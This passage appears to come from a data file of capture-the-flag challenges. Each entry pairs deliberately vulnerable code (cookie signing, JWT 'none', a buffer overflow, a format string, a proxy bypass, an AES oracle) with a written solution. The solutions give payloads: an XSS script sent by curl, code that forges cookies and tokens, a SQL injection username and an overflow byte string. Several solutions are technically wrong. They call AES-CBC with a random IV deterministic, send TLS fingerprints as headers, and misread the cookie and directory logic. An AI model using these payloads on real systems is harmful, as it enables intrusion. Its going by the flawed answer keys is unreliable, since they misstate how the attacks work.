(content, authorId)\n            VALUES (?, ?)\n            \",\n            content,\n            author_id\n        )\n        .execute(pool)\n        .await?;\n        Ok(())\n    }\n\n    pub async fn delete(pool: &Pool<Sqlite>, id: i64) -> sqlx::Result<()> {\n        sqlx::query!(\n            \"\n            DELETE FROM comment\n            WHERE id = ?\n            \",\n            id\n        )\n        .execute(pool)\n        .await?;\n        Ok(())\n    }\n\n    pub async fn is_owned_by(\n        pool: &Pool<Sqlite>,\n        comment_id: i64,\n        user_id: i64,\n    ) -> sqlx::Result<bool> {\n        Ok(sqlx::query!(\n            \"\n            SELECT COUNT(*) AS count\n            FROM comment\n            WHERE id = ? AND authorId = ?\n            \",\n            comment_id,\n            user_id\n        )\n        .fetch_one(pool)\n        .await?\n        .count\n            > 0)\n    }\n}",
		"solution": "Solution:\n\nThe goal of this challenge is to exploit the **comment injection** vulnerability in the web application to execute arbitrary JavaScript code.\n\n### Steps to Exploit:\n1. **Understand the Vulnerability:**\n   - The application allows users to post comments with HTML formatting using the `{{ comment.content|safe }}` template tag.\n   - This means that any HTML or JavaScript code injected into the comment will be rendered as-is, leading to a potential **Cross-Site Scripting (XSS)** vulnerability.\n\n2. **Injecting Malicious Code:**\n   - To exploit this vulnerability, we can inject a `<script>` tag into the comment content.\n   - For example, we can use the following payload:\n     ```html\n     <script>alert('XSS');</script>\n     ```\n   - When another user views this comment, the script will execute and display an alert box with the message 'XSS'.\n\n3. **Using Curl or Postman:**\n   - You can use tools like Curl or Postman to send a POST request with the malicious payload:\n     ```bash\n     curl -X POST -d \"content=<script>alert('XSS');</script>\" http://localhost:8000/comments/create\n     ```\n   - This should create a new comment with the injected script.\n\n4. **Viewing the Comment:**\n   - When another user views the comments section, they will see the alert pop up, indicating that the XSS vulnerability has been successfully exploited."
	},
	"signed_sealed_delivered":
	{
		"title": "Signed, Sealed, Delivered",
		"description": "You're given access to a web service that uses signed cookies to manage user authentication. Each cookie is structured like this:\n\n```\n<username>|<timestamp>|<signature>\n```\n\nThe server signs the cookie using a secret key with a custom XOR-based mechanism. Your task is to forge a valid cookie for the `admin` user.\n\nTo do this, you'll need to reverse-engineer the signature generation and **recover the secret key**. Once you have it, generate a new valid cookie with your own timestamp and signature, granting yourself admin access.\n\n\"use server\"\n\nconst SECRET_KEY = \"fake_key_for_testing\"\n\nfunction xorStrings(str1: string, str2: string): string {\n  const length = Math.max(str1.length, str2.length);\n\n  return Array.from({ length }, (_, i) =>\n    String.fromCharCode(\n      str1.charCodeAt(i % str1.length) ^ str2.charCodeAt(i % str2.length)\n    )\n  ).join(');\n}\n\nexport async function generateCookie(value: string): Promise<string> {\n  const timestamp = new Date().toISOString()\n  const signature = xorStrings(xorStrings(xorStrings(value, SECRET_KEY), timestamp), SECRET_KEY)\n  const b64Signature = btoa(signature)\n\n  return ${value}|${timestamp}|${b64Signature}\n}\n\nexport async function decodeCookie(cookie: string): Promise<{ success: boolean, value: string }> {\n  try {\n    const parts = cookie.split(\"|\")\n\n    if (parts.length !== 3) {\n      throw new Error(\"Supplied cookie does not have 3 parts.\")\n    }\n\n    const [value, timestamp, b64signature] = parts\n    const signature = atob(b64signature)\n\n    const expectedSignature = xorStrings(xorStrings(xorStrings(value, SECRET_KEY), timestamp), SECRET_KEY)\n\n    if (signature !== expectedSignature) {\n      throw new Error(\"Cookie signature is invalid.\")\n    }\n\n    return { success: true, value: value }\n  } catch (error) {\n    return { success: false, value: \"\" }\n  }\n}",
		"solution": "Solution:\n\nThe goal of this challenge is to exploit the **cookie signing** mechanism to forge a valid cookie for the `admin` user.\n\n### Steps to Exploit:\n1. **Understand the Cookie Structure:**\n   - The cookie is structured as `<username>|<timestamp>|<signature>`, where the signature is generated using a custom XOR-based mechanism.\n\n2. **Reverse Engineer the Signature Generation:**\n   - The signature is generated by XORing the username, timestamp, and a secret key in a specific order.\n   - The key part here is that the same secret key is used for both signing and verifying the cookie.\n\n3. **Recover the Secret Key:**\n   - By analyzing the `generateCookie` function, we can see that the signature is generated using the following formula:\n     ```javascript\n     signature = xorStrings(xorStrings(xorStrings(value, SECRET_KEY), timestamp), SECRET_KEY)\n     ```\n   - This means that if we know the `value` (username) and `timestamp`, we can recover the `SECRET_KEY` by XORing them with the signature.\n\n4. **Generate a Valid Cookie:**\n   - To generate a valid cookie for the `admin` user, we can use any username and timestamp, but we need to ensure that we calculate the correct signature using our own values.\n   - For example, if we set `value` to `admin`, we can generate a new timestamp and calculate the signature accordingly.\n\n5. **Example Code to Forge a Cookie:**\n```javascript\nconst SECRET_KEY = \"fake_key_for_testing\";\nconst username = \"admin\";\nconst timestamp = new Date().toISOString();\nconst forgedSignature = xorStrings(xorStrings(xorStrings(username, SECRET_KEY), timestamp), SECRET_KEY);\nconst b64Signature = btoa(forgedSignature);\nconst forgedCookie = `${username}|${timestamp}|${b64Signature}`;\nconsole.log(forgedCookie);\n```\nThis will generate a valid cookie for the `admin` user with your own timestamp and signature."
	},
	"fingerprint_me_if_you_can":
	{
		"title": "Fingerprint Me If You Can",
		"description": "This server doesn't care who you are, it only cares how you look on the wire. Deep in its core, it compares multiple layers of connection metadata, including:\n\nJA4 and JA4H TLS fingerprints\n\nHTTP/2 frame fingerprinting\n\nYour User-Agent header\n\nTo access the flag, your request must perfectly match a very specific client fingerprint.\n\nThe server uses the fingerproxy library to extract fine-grained metadata from incoming connections. You're not getting through by spoofing headers alone, you'll need to replicate the entire fingerprint signature to trick the server into thinking you're the expected client.\n\npackage main\n\nimport (\n  \"encoding/json\"\n  \"fmt\"\n  \"net/http\"\n  \"os\"\n\n  \"github.com/wi1dcard/fingerproxy/pkg/metadata\"\n)\n\nfunc flagServer(w http.ResponseWriter, req *http.Request) {\n  // JA4_r = t13d1516h2_002f,0035,009c,009d,1301,1302,1303,c013,c014,c02b,c02c,c02f,c030,cca8,cca9_0005,000a,000b,000d,0012,0017,001b,0023,002b,002d,0033,4469,fe0d,ff01_0403,0804,0401,0503,0805,0501,0806,0601\n  // JA4_ro = t13d1516h2_c030,1302,002f,009d,c014,1301,0035,1303,009c,c013,cca8,c02b,cca9,c02f,c02c_000b,001b,000d,002d,002b,0033,0012,0017,ff01,4469,0005,fe0d,000a,0023,0010,0000_0403,0804,0401,0503,0805,0501,0806,0601\n  // JA4_o = t13d1516h2_c20d6050442c_97f7806fcdbe\n  ja4FpToFind := \"t13d1516h2_8daaf6152771_02713d6af862\"\n  ja4hFpToFindFirstCut := \"ge20cr05enus\"\n  http2FpToFind := \"1:65536;2:0;4:6291456;6:262144|15663105|1:1:0:256|m,a,s,p\"\n  userAgentToFind := \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\"\n\n  _, verbosePresent := os.LookupEnv(\"VERBOSE\")\n\n  if verbosePresent {\n    fmt.Printf(\"[client %s]\", req.RemoteAddr)\n  }\n\n  data, ok := metadata.FromContext(req.Context())\n  if !ok {\n    if verbosePresent {\n      fmt.Printf(\"failed to get context\\n\")\n    }\n    http.Error(w, \"failed to get context\", http.StatusInternalServerError)\n    return\n  }\n\n  ja3Fp, err := fingerprintJA3(data)\n\n  if err != nil {\n    if verbosePresent {\n      fmt.Printf(\"%s\", err.Error())\n    }\n    http.Error(w, err.Error(), http.StatusInternalServerError)\n    return\n  }\n\n  ja4Fp, err := fingerprintJA4(data)\n\n  if err != nil {\n    if verbosePresent {\n      fmt.Printf(\"%s\", err.Error())\n    }\n    http.Error(w, err.Error(), http.StatusInternalServerError)\n    return\n  }\n\n  http2Fp := fingerprintHTTP2(data)\n\n  JA4H_a := fingerprintJA4H_a(req)\n\n  if verbosePresent {\n    detail, _ := json.Marshal(data)\n    fmt.Printf(\"detail: %s\", detail)\n    fmt.Printf(\"User-Agent: %s\\n\", req.UserAgent())\n    fmt.Printf(\"JA3 fingerprint: %s\\n\", ja3Fp)\n    fmt.Printf(\"JA4 fingerprint: %s\\n\", ja4Fp)\n    fmt.Printf(\"HTTP2 fingerprint: %s\\n\", http2Fp)\n    fmt.Printf(\"JA4H_a fingerprint: %s\\n\", JA4H_a)\n  }\n\n  if ja4Fp == ja4FpToFind && JA4H_a == ja4hFpToFindFirstCut &&\n    http2Fp == http2FpToFind && req.UserAgent() == userAgentToFind {\n    w.WriteHeader(http.StatusOK)\n    fmt.Fprintf(w, \"%s\", getEnv(\"FLAG\", \"NFL{THIS_IS_NOT_THE_REAL_FLAG__EXPLOIT_THE_SERVER}\"))\n    return\n  } else {\n    w.WriteHeader(http.StatusForbidden)\n    fmt.Fprintf(w, \"Access denied\")\n    return\n  }\n}",
		"solution": "Solution:\n\nThe goal of this challenge is to exploit the **fingerprinting** mechanism to bypass authentication and access the flag.\n\n### Steps to Exploit:\n1. **Understand the Fingerprinting Mechanism:**\n   - The server uses multiple layers of connection metadata, including JA3, JA4, HTTP/2 frame fingerprinting, and User-Agent header.\n   - The server checks if the incoming request matches a specific fingerprint signature.\n\n2. **Replicate the Fingerprint Signature:**\n   - To bypass the fingerprinting mechanism, you need to replicate the exact fingerprint signature that the server is expecting.\n   - This includes generating the correct JA3, JA4, HTTP/2 frame fingerprint, and User-Agent header.\n\n3. **Using Tools:**\n   - You can use tools like `curl` or `Postman` to send requests with custom headers and fingerprints.\n   - For example, you can use `curl` with the `-H` option to set custom headers:\n     ```bash\n     curl -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\" -H \"JA3: t13d1516h2_8daaf6152771_02713d6af862\" -H \"JA4: t13d1516h2_8daaf6152771_02713d6af862\" -H \"HTTP2: 1:65536;2:0;4:6291456;6:262144|15663105|1:1:0:256|m,a,s,p\" http://localhost:8000/\n```\n   - Make sure to replace the values with the expected fingerprints.\n\n4. **Accessing the Flag:**\n   - If your request matches the expected fingerprint, the server will respond with the flag."
	},
	"leaky_directory":
	{
		"title": "Leaky Directory",
		"description": "Leaky Directory\n\nWelcome to the corporate portal of **Insecure Inc.** Employees can log in, register, and browse a company directory of verified users.\n\nYou're in, but only as a normal user. Somewhere in the system is an **admin profile** holding a secret value… an `api_key` that just happens to be the **flag**.\n\nUnfortunately, that sensitive data isn't exposed to regular users, or at least, **it's not supposed to be**.\n\nThe application uses session-based login, Flask templates, and has some input handling sprinkled around. But the backend may not handle access controls and object visibility as securely as it should.\n\n### Goal:\n\nDiscover the **admin's API key** (which contains the flag). The admin is a verified user and their information is stored in memory like any other user, the question is, **how do you access their private data?**\n\n### What You Know:\n\n* You can register/login as a normal user.\n* Each user has a profile, including one for the admin (`admin@example.com`).\n* There's a `/directory/<id>` endpoint that shows public user info.\n* The `api_key` is only visible internally, **but not in public views.**\n* The app filters based on \"verified\" status in the directory.\n* The flag is stored as the `api_key` for the `admin` user.\n\nfrom flask import Flask, request, redirect, url_for, session, render_template, abort\nfrom functools import wraps\nfrom werkzeug.security import generate_password_hash, check_password_hash\nimport secrets\nimport os\n\napp = Flask(__name__)\napp.secret_key = 'supersecretkey'\n\nusers = {\n    1: {\n        \"username\": \"user1\",\n        \"email\": \"user1@example.com\",\n        \"role\": \"user\",\n        \"verified\": True,\n        \"password\": generate_password_hash(secrets.token_urlsafe(20)),\n        \"api_key\": secrets.token_urlsafe(32)\n    },\n    2: {\n        \"username\": \"user2\",\n        \"email\": \"user2@example.com\",\n        \"role\": \"user\",\n        \"verified\": True,\n        \"password\": generate_password_hash(secrets.token_urlsafe(20)),\n        \"api_key\": secrets.token_urlsafe(32)\n    },\n    3: {\n        \"username\": \"admin\",\n        \"email\": \"admin@example.com\",\n        \"role\": \"admin\",\n        \"verified\": True,\n        \"password\": generate_password_hash(secrets.token_urlsafe(20)),\n        \"api_key\": os.environ.get(\"FLAG\")\n    }\n}\n\nnext_user_id = max(users.keys()) + 1\n\ndef login_required(f):\n    @wraps(f)\n    def decorated_function(*args, **kwargs):\n        if 'user_id' not in session:\n            return redirect(url_for('home'))\n        return f(*args, **kwargs)\n    return decorated_function\n\n@app.route('/')\ndef home():\n    return render_template('home.html.j2')\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n\n    for user_id, user in users.items():\n        if user['username'] == username and check_password_hash(user['password'], password):\n            session['user_id'] = user_id\n            return redirect(url_for('home'))\n\n    return redirect(url_for('home'))\n\n@app.route('/register', methods=['POST'])\ndef register():\n    global next_user_id\n    username = request.form['username']\n    password = request.form['password']\n\n    if any(user['username'] == username for user in users.values()) or len(password) < 8:\n        return redirect(url_for('home'))\n\n    users[next_user_id] = {\n        \"username\": username,\n        \"email\": \"\",\n        \"role\": \"user\",\n        \"verified\": False,\n        \"password\": generate_password_hash(password)\n    }\n    session['user_id'] = next_user_id\n    next_user_id += 1\n\n    return redirect(url_for('home'))\n\ndef load_profile(id=None):\n    if id is not None:\n        user_id = id\n    elif 'user_id' in session:\n        user_id = session['user_id']\n    else:\n        return None\n\n    if int(user_id) in users:\n        user = dict(users[int(user_id)])\n        user.pop('password', None)\n        return user\n    return None\n\n@app.route('/directory/<int:id>')\ndef directory_info(id: int):\n    user = load_profile(id)\n    if user is not None:\n        user.pop('api_key', None)  # Intended sanitization\n        return render_template('profile.html.j2', public=True, **user)\n    return abort(404)\n\nif __name__ == '__main__':\n    app.run(debug=True, threaded=True)",
		"solution": "Solution:\n\nThe goal of this challenge is to exploit the **directory information leak** to access the `api_key` of the `admin` user.\n\n### Steps to Exploit:\n1. **Understand the Application Logic:**\n   - The application uses Flask for web development and has a session-based login system.\n   - Each user has a profile, including one for the admin, and the `api_key` is stored in memory.\n   - The `directory_info` function is responsible for displaying user information, but it sanitizes the output by removing the `api_key` before rendering.\n\n2. **Identify the Vulnerability:**\n   - The `load_profile` function retrieves user information based on the user ID, and the `directory_info` function displays it.\n   - However, the `api_key` is only removed from the view when accessing a specific user's profile.\n   - This means that if you can access the admin's profile directly, you can bypass the sanitization.\n\n3. **Accessing the Admin Profile:**\n   - You can register as a normal user and log in to the application.\n   - Then, you can access the admin's profile by navigating to `/directory/3`, where `3` is the ID of the admin user.\n\n4. **Extracting the API Key:**\n   - When you access `/directory/3`, you will see all the information about the admin user, including their `api_key`, which contains the flag.\n\n5. **Example Request:**\n   - You can use a web browser or a tool like Curl to access the admin's profile:\n     ```bash\n     curl http://localhost:5000/directory/3\n     ```\n   - This should return the admin's profile information, including their `api_key`."
	},
	"silent_auth":
	{
		"title": "Silent Auth",
		"description": "You've found a mysterious old login program left behind by a paranoid developer who *thought* they secured it. The password check appears to be commented out, so the program shouldn't let *anyone* in.\n\n...but then again, old C programs and `gets()` have a history of betraying their creators.\nCan you convince it to show you the **flag**?\n\nGain access to the flag by bypassing the authentication check.\n\n#include <stdio.h>\n#include <string.h>\n\nvoid print_flag(){\n        FILE *f = fopen(\"flag.txt\",\"r\");\n        char flag[200];\n\n        fgets(flag, 199, f);\n        printf(\"%s\", flag);\n}\n\nvoid login(){\n        char password[100] = \"\";\n        char username[100] = \"\";\n\n        printf(\"Username: \");\n        gets(username);\n\n        // If I disable the password, nobody will get in.\n        //printf(\"Password: \");\n        //gets(password);\n\n        if(!strcmp(username, \"bytereaper\") && !strcmp(password, \"5up3rP4zz123Byte\")){\n                print_flag();\n        }\n        else{\n                printf(\"Wrong password! No flag for you.\");\n        }\n}\n\nvoid main(){\n        setvbuf(stdin, NULL, _IONBF, 0);\n        setvbuf(stdout, NULL, _IONBF, 0);\n        setvbuf(stderr, NULL, _IONBF, 0);\n\n        // Start login process\n        login();\n\n        return;\n}",
		"solution": "Solution:\n\nThe goal of this challenge is to exploit the **buffer overflow** vulnerability in the C program to bypass the authentication check and access the flag.\n\n### Steps to Exploit:\n1. **Understand the Vulnerability:**\n   - The program uses `gets()` to read user input into a fixed-size buffer (`username`), which can lead to a buffer overflow if the input exceeds the buffer size.\n   - The password gets is commented out, so we need to overflow the username field to set the password variable.\n\n2. **Identify the Buffer Overflow:**\n   - The `username` buffer is 100 bytes long, and if we provide an input longer than that, it will overwrite adjacent memory, including the password variable content.\n\n3. **Crafting the Payload:**\n   - We can craft a payload that overwrites the password variable with the address of the hardcoded password, which will allow us to get in the vault.\n   - The payload should be structured as follows:\n     - Fill the `username` buffer with 100 bytes of junk data (e.g., `A`s).\n     - Append the address of the password variable.\n\n4. **Example Payload:**\n   - Assuming the address of the password variable is `0xdeadbeef`, the payload would look like this:\n     ```python\n     payload = b\"A\" * 100 + b\"\\xef\\xbe\\xad\\xde\"\n     ```\n   - You can use a tool like `pwntools` to automate this process.\n\n5. **Using a Debugger:**\n   - You can use a debugger like `gdb` to analyze the program and find the exact address of the password variable.\n   - Set a breakpoint at the `login()` function and inspect the memory layout to find the address.\n\n6. **Executing the Exploit:**\n   - Compile the program and run it with your crafted payload to bypass authentication and access the flag."
	},
	"format_me_not":
	{
		"title": "Format Me Not",
		"description": "This lab prints a personalized message after entering a username. The flag is loaded into memory but never shown to the user.\n\nSolve the lab by exploiting a format string vulnerability to leak the flag.\n\nYou can interact with the program by entering any username when prompted.\n\n#include <stdio.h>\n#include <string.h>\n\nvoid print_flag(char *username){\n        FILE *f = fopen(\"flag.txt\",\"r\");\n        char flag[200];\n\n        fgets(flag, 199, f);\n\n        //The user needs to be mocked for thinking they could retrieve the flag\n        printf(\"Hello, \");\n        printf(username);\n        printf(\". Was version 2.0 too simple for you? Well I don't see no flags being shown now xD xD xD...\\n\\n\");\n        printf(\"Yours truly,\\nByteReaper\\n\\n\");\n}\n\nvoid login(){\n        char username[100] = \"\";\n\n        printf(\"Username: \");\n        gets(username);\n\n        // The flag isn't printed anymore. No need for authentication\n        print_flag(username);\n}\n\nvoid main(){\n        setvbuf(stdin, NULL, _IONBF, 0);\n        setvbuf(stdout, NULL, _IONBF, 0);\n        setvbuf(stderr, NULL, _IONBF, 0);\n\n        // Start login process\n        login();\n\n        return;\n}",
		"solution": "Solution:\n\nThe goal of this challenge is to exploit the **format string vulnerability** in the C program to leak the flag.\n\n### Steps to Exploit:\n1. **Understand the Vulnerability:**\n   - The program uses `printf()` to print user input directly without proper sanitization, which can lead to a format string vulnerability.\n   - This allows an attacker to read arbitrary memory locations by using format specifiers like `%s`, `%x`, etc.\n\n2. **Identify the Format String Vulnerability:**\n   - The `print_flag` function takes a `username` parameter and prints it directly using `printf(username)`, which is unsafe.\n   - By providing a format string as input, we can control the output and read memory locations.\n\n3. **Crafting the Payload:**\n   - To leak the flag, we can use a payload that includes format specifiers to read memory addresses where the flag is stored.\n   - For example, if we want to read 4 bytes from memory, we can use `%x` or `%s` format specifiers.\n\n4. **Example Payload:**\n   - You can craft a payload like this:\n     ```python\n     payload = \"%x %x %x %x\"\n     ```\n   - This will print out 4 words from the stack, which may include the address of the flag.\n\n5. **Using a Debugger:**\n   - You can use a debugger like `gdb` to analyze the program and find the exact address of the flag in memory.\n   - Set a breakpoint at the `print_flag` function and inspect the stack to find the address of the flag.\n\n6. **Executing the Exploit:**\n   - Compile the program and run it with your crafted payload as input to leak the flag from memory."
	},
	"none_shall_pass":
	{
		"title": "None Shall Pass",
		"description": "This lab uses JSON Web Tokens (JWT) to manage user sessions. Users can register and receive an access token using the HS256 algorithm.\n\nHowever, the server supports multiple algorithms, including none. If you can forge a token and make the server believe you're an admin, you'll access a flag on your profile page.\n\nAccess your profile page as an admin and retrieve the flag.\n\nYou can register with any username that doesn't include \"admin\" (case-insensitive).\n\ndef decode_access_token(token):\n    try:\n        user_data = jwt.decode(token, options={\"verify_signature\": False})\n        user = user_data['user']\n        algorithm = User.query.filter_by(username=user).first().jwt_algorithm\n        if algorithm == 'HS256':\n            user_data = jwt.decode(token, app.config['JWT_SECRET'], algorithms=[algorithm])\n        elif algorithm == 'none':\n            user_data = jwt.decode(token, options={'verify_signature': False}, algorithms=[algorithm])\n        else:\n            user_data = jwt.decode(token, algorithms=[algorithm])\n    except:\n        return None\n    return user_data\n\n@app.route('/register', methods=['GET', 'POST'])\ndef register():\n    if request.method == 'POST':\n        username = request.form.get('username')\n        password = request.form.get('password')\n\n        if \"admin\" in username.lower():\n            return render_template('register.html', error=\"Huuh no admin registering for you.\")\n        user = User.query.filter_by(username=username).count()\n        if not user:\n            try:\n                db.session.execute(text(f'INSERT INTO User (username, password_hash, jwt_algorithm) VALUES (\"{username}\", \"{bcrypt.hashpw(password.encode(\"utf-8\"), bcrypt.gensalt()).decode(\"utf-8\")}\", \"HS256\")'))\n                db.session.commit()\n            except:\n                return render_template('register.html', error=\"Database error\")\n            response = redirect(url_for('login_page'))\n            return response\n\n        return render_template('register.html', error=\"User already exists\")\n\n    return render_template('register.html')\n\n@app.route('/profile')\ndef profile():\n    if 'access_token' in request.cookies:\n        user_jwt = request.cookies['access_token']\n        user_data = decode_access_token(user_jwt)\n        if user_data is None:\n            return render_template('profile.html', error=\"Error validating token\")\n        if 'user' in user_data and 'admin' in user_data and user_data['admin']:\n            return render_template('profile.html', username=user_data['user'], flag=app.config['FLAG'])\n        elif 'user' in user_data:\n            return render_template('profile.html', username=user_data['user'])\n    return redirect(url_for('login_page'))",
		"solution": "Solution:\n\nThe goal of this challenge is to exploit the **JWT (JSON Web Token)** signing mechanism to forge a token that grants admin access and allows you to retrieve the flag.\n\n### Steps to Exploit:\n1. **Understand the JWT Structure:**\n   - JWTs are composed of three parts: Header, Payload, and Signature.\n   - The server uses HS256 for signing tokens, but it also supports the `none` algorithm, which means no signature verification.\n\n2. **Identify the Vulnerability:**\n   - The server allows users to register with any username that doesn't include \"admin\" (case-insensitive).\n   - The `decode_access_token` function decodes the token without verifying the signature if the algorithm is set to `none`.\n   - There is also a SQL Injection vulnerability in the registration process, we can use it to set our created account to have the `none` algorithm.\n\n3. **Registering a User:**\n   - You can register a new user with a username that doesn't include \"admin\" and that set the `jwt_algorithm` to `none`.\n   - For example, you can register with user1\", \"password\", \"none\"); --\n   - This will create a new user with the `none` algorithm.\n\n4. **Crafting the JWT Token:**\n   - After registering, you can create a JWT token with the payload containing the `admin` claim:\n     ```json\n     {\n       \"user\": \"admin\",\n       \"admin\": true\n     }\n     ```\n   - You can use any JWT library to create the token with the `none` algorithm.\n\n5. **Example Code to Forge a Token:**\n   - You can use a library like `PyJWT` in Python to create the token:\n     ```python\n     import jwt\n\n     payload = {\n         'user': 'admin',\n         'admin': True\n     }\n     token = jwt.encode(payload, None, algorithm='none')\n     print(token)\n     ```\n   - This will generate a JWT token with the `none` algorithm.\n\n6. **Accessing the Profile Page:**\n   - Set the generated token as a cookie in your browser and navigate to the `/profile` page.\n   - If everything is set up correctly, you should see the flag displayed on your profile page."
	},
	"proxy_drama":
	{
		"title": "Proxy Drama",
		"description": "A reverse proxy stands guard, allowing only requests with action=getInfo to reach the backend API. It strictly checks for valid JSON and blocks anything that looks suspicious.\n\nHowever, the backend Flask service behaves differently when passed other action values, especially one labeled getFlag. But here's the twist: the proxy won't forward anything that doesn't say getInfo.\n\nCan you find a way to bypass the proxy's validation, hit the backend's hidden route, and trigger an internal server error?\n\nIf you manage to break the backend's JSON parsing, it might slip up and reveal sensitive debug information, including secrets.\n\nrequire 'sinatra'\nrequire 'rack/proxy'\nrequire 'json'\n\nclass ReverseProxy < Rack::Proxy\n  def perform_request(env)\n    request = Rack::Request.new(env)\n\n    # Only allow requests to the /api?action=getInfo endpoint\n    if request.params['action'] == 'getInfo'\n      env['HTTP_HOST'] = 'backend:5000'\n      env['PATH_INFO'] = '/api'\n      env['QUERY_STRING'] = request.query_string\n      body = request.body.read\n      env['rack.input'] = StringIO.new(body)\n      \n      begin\n        json_data = JSON.parse(body)\n        puts \"Received valid JSON data: #{json_data}\"\n        super(env)\n      rescue JSON::ParserError => e\n        puts \"Error parsing JSON: #{e.message}\"\n        return [200, { 'Content-Type' => 'application/json' }, [{ message: \"Error parsing JSON\", error: e.message }.to_json]]\n      end\n    else\n      [200, { 'Content-Type' => 'text/plain' }, [\"Unauthorized\"]]\n    end\n  end\nend\n\nuse ReverseProxy\n\nset :bind, '0.0.0.0'\nset :port, 8080\nputs \"Server is listening on port 8080...\"\n\nfrom flask import Flask, jsonify, request\nimport os\nimport logging\n\napp = Flask(__name__)\n\napp.config['DEBUG'] = os.getenv('DEBUG', 'False')\napp.config['LOG_LEVEL'] = os.getenv('LOG_LEVEL', 'warning')\n\n\n@app.route('/api', methods=['POST'])\ndef api():\n    param = request.args.get('action')\n    app.logger.info(f\"Received param: {param}\")\n\n    if param == 'getFlag':\n        try:\n            data = request.get_json()\n            app.logger.info(f\"Received JSON data: {data}\")\n            return jsonify(message=\"Prased JSON successfully\")\n        except Exception as e:\n            app.logger.error(f\"Error parsing JSON: {e}\")\n            debug_data = {\n                'headers': dict(request.headers),\n                'method': request.method,\n                'url': request.url,\n                'env_vars': {key: value for key, value in os.environ.items()}\n            }\n            return jsonify(message=\"Something broke!!\", debug_data=debug_data)\n\n    if param == 'getInfo':\n        debug_status = app.config['DEBUG']\n        log_level = app.config['LOG_LEVEL']\n        return jsonify(message=\"Info retrieved successfully!\", debug=debug_status, log_level=log_level)\n\n    return jsonify(message=\"Invalid action parameter!\", param=param)\n\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)",
		"solution": "Solution:\n\nThe goal of this challenge is to exploit the **reverse proxy** and **JSON parsing** vulnerability to access the hidden `getFlag` endpoint and retrieve sensitive information.\n\n### Steps to Exploit:\n1. **Understand the Proxy Behavior:**\n   - The reverse proxy only allows requests with `action=getInfo` to reach the backend API.\n   - It strictly checks for valid JSON and blocks anything that looks suspicious.\n\n2. **Identify the Backend Behavior:**\n   - The backend Flask service has a hidden route `/api` that accepts `action=getFlag`.\n   - If this action is called, it attempts to parse JSON data and may return sensitive debug information if an error occurs.\n\n3. **Bypassing the Proxy:**\n   - To bypass the proxy's validation, you can send a request with `action=getInfo` but include a payload that triggers the backend's `getFlag` behavior.\n   - You can use a tool like `curl` or Postman to send a POST request to the proxy with the following payload:\n     ```json\n     {\n       \"action\": \"getInfo\",\n       \"data\": \"{\\\"action\\\": \\\"getFlag\\\"}\"\n     }\n     ```\n   - This payload tricks the proxy into thinking it's a valid request while actually targeting the `getFlag` action on the backend.\n\n4. **Triggering an Internal Server Error:**\n   - If you send malformed JSON or an unexpected payload, it may cause the backend to throw an internal server error, revealing sensitive debug information.\n   - You can modify your payload to include invalid JSON syntax or unexpected data types to trigger this error.\n\n5. **Example Request:**\n   - Use `curl` to send the request:\n     ```bash\n     curl -X POST http://localhost:8080/api?action=getInfo -H \"Content-Type: application/json\" -d '{\"action\": \"getInfo\", \"data\": \"{\\\"a\\\": \\\"\\xFF\\\"}\"}'\n     ```\n   - This should return debug information, including sensitive data such as environment variables and headers."
	},
	"eldoria_encrypted_echoes":
	{
		"title": "Eldoria's Encrypted Echoes",
		"description": "This service encrypts `username + password` using AES-CBC with a fixed secret key. You can provide a username and receive the ciphertext. The password is randomly generated and not shown.\n\nYour goal is to recover the password and use it to authenticate as admin.\n\n**Solve the challenge by submitting the correct password when prompted.**\n\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad\nimport os, string, random, re\n\nKEY = os.urandom(32)\n\npassword = ''.join([random.choice(string.ascii_letters+string.digits) for _ in range(20)])\n\ndef encrypt_creds(user):\n    padded = pad((user + password).encode(), 16)\n    IV = os.urandom(16)\n    cipher = AES.new(KEY, AES.MODE_CBC, iv=IV)\n    ciphertext = cipher.decrypt(padded)\n    return ciphertext\n\ndef admin_login(pwd):\n    return pwd == password\n\n\ndef show_menu():\n    return input('''\n=========================================\n||                                     ||\n||   \uD83C\uDFF0 Eldoria's Shadow Keep \uD83C\uDFF0       ||\n||                                     ||\n||  [1] Seal Your Name in the Archives ||\n||  [2] Enter the Forbidden Sanctum    ||\n||  [3] Depart from the Realm          ||\n||                                     ||\n=========================================\n\nChoose your path, traveler :: ''')\n\ndef main():\n    while True:\n        ch = show_menu()\n        print()\n        if ch == '1':\n            username = input('[+] Speak thy name, so it may be sealed in the archives :: ')\n            pattern = re.compile(r\"^\\w{16,}$\")\n            if not pattern.match(username):\n                print('[-] The ancient scribes only accept proper names-no forbidden symbols allowed.')\n                continue\n            encrypted_creds = encrypt_creds(username)\n            print(f'[+] Thy credentials have been sealed in the encrypted scrolls: {encrypted_creds.hex()}')\n        elif ch == '2':\n            pwd = input('[+] Whisper the sacred incantation to enter the Forbidden Sanctum :: ')\n            if admin_login(pwd):\n                print(f\"[+] The gates open before you, Keeper of Secrets! {open('flag.txt').read()}\")\n                exit()\n            else:\n                print('[-] You salt not pass!')\n        elif ch == '3':\n            print('[+] Thou turnest away from the shadows and fade into the mist...')\n            exit()\n        else:\n            print('[-] The oracle does not understand thy words.')\n\nif __name__ == '__main__':\n    main()",
		"solution": "Solution:\n\nThe goal of this challenge is to exploit the **AES encryption** mechanism to recover the password used in the `admin_login` function.\n\n### Steps to Exploit:\n1. **Understand the Encryption Process:**\n   - The service encrypts the concatenation of `username` and `password` using AES-CBC with a fixed secret key.\n   - The password is randomly generated and not shown, but it is stored in memory.\n\n2. **Identify the Vulnerability:**\n   - The `encrypt_creds` function pads the concatenated string and encrypts it using AES-CBC.\n   - The ciphertext is returned as a hexadecimal string, which can be used to analyze the encryption process.\n\n3. **Crafting the Payload:**\n   - You can provide a username that matches the expected format (16 characters long) to generate a valid ciphertext.\n   - The ciphertext will contain both the username and the password, which can be extracted later.\n\n4. **Extracting the Password:**\n   - Since AES-CBC is deterministic, you can use a known plaintext attack to recover the password by manipulating the input.\n   - By providing a specific username, you can control the ciphertext and extract the password from it.\n\n5. **Example Code to Extract Password:**\n   - You can use a library like `pycryptodome` to decrypt the ciphertext and extract the password:\n     ```python\n     from Crypto.Cipher import AES\n     from Crypto.Util.Padding import unpad\n     import 